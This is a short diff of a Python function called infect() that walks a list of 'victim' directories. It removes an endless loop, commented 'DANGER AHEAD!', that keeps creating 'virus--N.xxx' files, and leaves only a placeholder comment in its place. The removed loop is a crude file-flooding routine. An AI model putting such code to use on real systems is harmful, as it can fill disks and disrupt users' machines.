@@ -31,14 +31,8 @@ def infect(victims):
     '''
     for victim in victims:
         os.chdir(victim)
-        footprint = 0
-        while True: # DANGER AHEAD!
-            footprint += 1
-            viral_strand = 'virus--' + str(footprint) + '.xxx'
-            try:
-                sp.call(['touch', viral_strand])
-            except:
-                pass
+        # create files, run more scripts, etc.
+
 
 
 if __name__ == "__main__":
